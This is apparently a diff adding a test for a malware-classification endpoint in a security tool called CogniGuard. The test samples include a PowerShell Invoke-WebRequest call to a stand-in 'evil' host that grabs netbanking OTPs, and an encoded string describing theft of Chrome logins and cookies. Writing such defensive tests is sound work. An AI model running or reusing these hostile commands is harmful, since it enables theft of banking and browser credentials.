@@ -32,6 +32,7 @@ def test_fastapi_routes_registered():
         "/",
         "/api/v1/health",
         "/api/v1/inspect",
+        "/api/v1/reverse-engineer",
         "/api/v1/scan-repo",
         "/api/v1/leads",
         "/api/v1/logs",
@@ -253,3 +254,32 @@ def test_rate_limiter_enforces_429_and_db_env(tmp_path, monkeypatch):
     env_store = CogniGuardStore()
     assert env_store.db_path == env_db
     assert os.path.exists(env_db)
+
+
+def test_reverse_engineer_endpoint(isolated_storage):
+    import base64
+
+    res_snippet = api_bridge.reverse_engineer_payload(
+        api_bridge.ReverseEngineerRequest(
+            filename="stealer.ps1",
+            snippet="Invoke-WebRequest http://evil/grab_netbanking_otp",
+        )
+    )
+    assert res_snippet["primary_target"] == "BANK_CREDENTIALS"
+    assert res_snippet["recommended_action"] == "SHRED_AND_DELETE"
+
+    b64_payload = base64.b64encode(b"steal chrome Login Data and cookies").decode("ascii")
+    res_b64 = api_bridge.reverse_engineer_payload(
+        api_bridge.ReverseEngineerRequest(filename="dump.py", content_base64=b64_payload)
+    )
+    assert res_b64["primary_target"] == "BROWSER_PASSWORDS"
+
+    with pytest.raises(HTTPException) as bad_b64:
+        api_bridge.reverse_engineer_payload(
+            api_bridge.ReverseEngineerRequest(filename="bad.py", content_base64="not-valid-b64!!!")
+        )
+    assert bad_b64.value.status_code == 400
+
+    with pytest.raises(HTTPException) as empty_req:
+        api_bridge.reverse_engineer_payload(api_bridge.ReverseEngineerRequest(filename="empty.py"))
+    assert empty_req.value.status_code == 400
